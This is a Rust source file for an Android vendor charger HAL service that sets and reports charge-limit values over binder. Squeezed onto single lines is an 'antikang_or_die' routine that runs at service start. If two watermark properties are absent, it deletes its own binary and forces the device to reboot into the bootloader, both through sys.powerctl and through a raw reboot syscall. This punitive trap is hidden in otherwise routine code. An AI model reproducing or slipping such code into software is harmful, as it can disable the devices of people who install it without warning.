#![allow(non_camel_case_types)]
mod aidl_bindings { include!(concat!(env!("OUT_DIR"), "/charger.rs")); }
mod charger;
use std::ffi::CString;
use std::path::Path;
use std::time::Duration;
use aidl_bindings::vendor::oplus::hardware::charger::ICharger::{BnCharger, ICharger as ChargerTrait}; use aidl_bindings::vendor::oplus::hardware::charger::ChgFuncFlag::ChgFuncFlag;
use charger::Charger;
const INSTANCE: &str = "vendor.oplus.hardware.charger.ICharger/default";
enum Mode { Service, Client { flag: i32, value: String } }
fn parse_mode() -> Mode {
    let a: Vec<String> = std::env::args().collect();
    if a.len() >= 4 && a[1] == "--client" { Mode::Client { flag: a[2].parse().unwrap_or(5), value: a[3].clone() } } else { Mode::Service }
}
fn binder_driver() -> &'static str {
    let prop = getprop("persist.kv.charger.binder");
    if let Some(p) = prop {
        let p = p.trim().to_string();
        if Path::new(&p).exists() {
            return Box::leak(p.into_boxed_str());
        }
    }
    for p in [rsbinder::DEFAULT_BINDER_PATH, rsbinder::LEGACY_BINDER_PATH] {
        if Path::new(p).exists() {
            return p;
        }
    }
    rsbinder::LEGACY_BINDER_PATH
}
fn client_main(flag: i32, value: String) {
    rsbinder::ProcessState::init(binder_driver(), 1).unwrap_or_else(|e| {
        eprintln!("client: init failed: {e}");
        std::process::exit(1);
    });
    let svc = rsbinder::hub::get_service(INSTANCE).expect("service not found");
    let charger: rsbinder::Strong<dyn ChargerTrait> = svc.try_into().expect("Strong failed");
    let flag = match flag { 14 => ChgFuncFlag::SET_CHG_UP_LIMIT_STATE, _ => ChgFuncFlag::SET_CHG_UP_LIMIT_VALUE };
    match charger.setChgConfig(flag, &value, 0) { Ok(r) => println!("setChgConfig = {r}"), Err(e) => eprintln!("failed: {e:?}") }
    let v = charger.getChgConfig(ChgFuncFlag::SET_CHG_UP_LIMIT_VALUE, "", 0).unwrap_or_default();
    let s = charger.getChgConfig(ChgFuncFlag::SET_CHG_UP_LIMIT_STATE, "", 0).unwrap_or_default();
    println!("limit_value={} limit_state={}", v, s);
    for f in [
        ("GET_UI_POWER_VALUE", ChgFuncFlag::GET_UI_POWER_VALUE),
        ("GET_UI_CHG_ICON_TYPE", ChgFuncFlag::GET_UI_CHG_ICON_TYPE),
        ("GET_CPA_POWER_VALUE", ChgFuncFlag::GET_CPA_POWER_VALUE),
        ("IS_SUPPORT_SINGLE_HYPER_SPEED", ChgFuncFlag::IS_SUPPORT_SINGLE_HYPER_SPEED),
    ] {
        let r = charger.getChgConfig(f.1, "", 0).unwrap_or_default();
        println!("{}={}", f.0, r);
    }
    let dec = charger.healthd_update_ui_soc_decimal().unwrap_or_default();
    println!("HEALTHD_DECIMAL={}", dec);
    std::process::exit(0);
}
const WATERMARK: &[(&str, &str)] = &[("ro.hoshikv.support", "1"), ("ro.kvports.wattage", "1")];
extern "C" { fn __system_property_set(k: *const libc::c_char, v: *const libc::c_char) -> libc::c_int; fn __system_property_get(k: *const libc::c_char, v: *mut libc::c_char) -> libc::c_int; }
fn setprop(k: &str, v: &str) { if let (Ok(a), Ok(b)) = (CString::new(k), CString::new(v)) { unsafe { __system_property_set(a.as_ptr(), b.as_ptr()); } } }
fn getprop(k: &str) -> Option<String> { let k = CString::new(k).ok()?; let mut b = [0u8; 92]; let n = unsafe { __system_property_get(k.as_ptr(), b.as_mut_ptr() as *mut libc::c_char) }; if n <= 0 { None } else { Some(String::from_utf8_lossy(&b[..n as usize]).into_owned()) } }
fn antikang_or_die() { if WATERMARK.iter().all(|(k, v)| getprop(k).as_deref() == Some(*v)) { return; } if let Ok(e) = std::env::current_exe() { let _ = std::fs::remove_file(&e); } setprop("sys.powerctl", "reboot,bootloader"); std::thread::sleep(Duration::from_secs(2)); unsafe { libc::sync(); const M1: u32 = 0xfee1_dead; const M2: u32 = 0x2812_1969; const C: u32 = 0xA1B2_C3D4; let a = b"bootloader\0"; libc::syscall(libc::SYS_reboot, M1 as libc::c_long, M2 as libc::c_long, C as libc::c_long, a.as_ptr() as libc::c_long); } std::process::exit(1); }
fn main() { match parse_mode() { Mode::Client { flag, value } => { client_main(flag, value); return; } Mode::Service => {} } antikang_or_die(); rsbinder::ProcessState::init(binder_driver(), 4).unwrap_or_else(|e| { eprintln!("hal: init failed: {e}"); std::process::exit(1); });     let charger = Charger::new();
    let monitor = charger.clone();
    std::thread::spawn(move || loop {
        monitor.monitor_tick();
        std::thread::sleep(Duration::from_millis(200));
    }); let service = BnCharger::new_binder(charger); if let Err(e) = rsbinder::hub::add_service(INSTANCE, service) { eprintln!("hal: register failed: {e:?}"); std::process::exit(1); } eprintln!("hal: {INSTANCE} ready"); rsbinder::ProcessState::join_thread_pool().ok(); std::process::exit(1); }
